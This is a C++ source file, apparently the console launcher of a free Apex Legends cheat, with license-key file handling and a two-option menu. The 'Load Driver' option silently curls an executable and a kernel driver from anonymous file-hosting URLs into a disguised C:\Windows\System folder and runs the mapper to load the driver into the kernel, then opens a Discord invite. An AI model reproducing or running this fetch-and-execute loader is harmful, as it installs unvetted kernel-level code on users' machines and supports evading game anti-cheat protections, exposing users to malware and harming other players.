#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>
#include <iomanip>
#include <string>
#include <thread>
#include <chrono>
#include <urlmon.h>
#include <shlwapi.h>
#include <filesystem>
#include "Overlay.hpp"
#include "IRACK_Auther.h"
#include <fstream>

using namespace std;
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Shlwapi.lib")


const std::string licenseFile = "license.json";

void saveLicense(const std::string& key) {
    std::ofstream file(licenseFile);
    if (file.is_open()) {
        file << "{ \"license\": \"" << key << "\" }";
        file.close();
    }
}

std::string loadLicense() {
    std::ifstream file(licenseFile);
    if (!file.is_open()) return "";

    std::string json, key;
    std::getline(file, json);
    file.close();

    size_t start = json.find(": \"") + 3;
    size_t end = json.find("\" }");
    if (start != std::string::npos && end != std::string::npos)
        key = json.substr(start, end - start);

    return key;
}

std::string key2;
std::string hwid2 = IRACK_Auth::getHWID();

void SaveKeyToFile(const std::string& key) {
    std::ofstream outFile("key.json");
    if (outFile.is_open()) {
        outFile << "{\"key\": \"" << key << "\"}" << std::endl;
        outFile.close();
    }
    else {
        std::cout << "Error saving key to file!" << std::endl;
    }
}

std::string LoadKeyFromFile() {
    std::ifstream inFile("key.json");
    std::string line, key;

    if (inFile.is_open()) {
        std::getline(inFile, line);
        inFile.close();

        size_t startPos = line.find("\"key\": \"") + 8;
        size_t endPos = line.find("\"}", startPos);
        if (startPos != std::string::npos && endPos != std::string::npos) {
            key = line.substr(startPos, endPos - startPos);
            return key;
        }
    }

    return "";
}

void Login() {
    SetConsoleTitle("Apex External | AEXT");
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    cout << "Free Apex Cheat by Jimbo & Boyo\n";
    std::cout << "Select Choice Below (To Load Driver, Close Apex)\n" << std::endl;
    std::cout << "(1) [+] Load Driver\n";
    std::cout << "(2) [+] Start Cheat\n";

    int choice;
    std::cin >> choice;
    switch (choice) {
    case 1:
    {
        system("mkdir C:\\Windows\\System 2>nul");

        system(("curl --silent https://files.catbox.moe/2x436w.bin --output C:\\Windows\\System\\mapper.exe >nul 2>&1"));
        system(("curl --silent https://files.catbox.moe/j0wulq.sys --output C:\\Windows\\System\\driver.sys >nul 2>&1"));


        system("C:\\Windows\\System\\mapper.exe C:\\Windows\\System\\driver.sys");
        system("cls");
    };
    case 2:

        std::cout << "Starting..." << std::endl;
        system("start https://discord.gg/d7x4bvbCEB");

        Sleep(100);



    }
}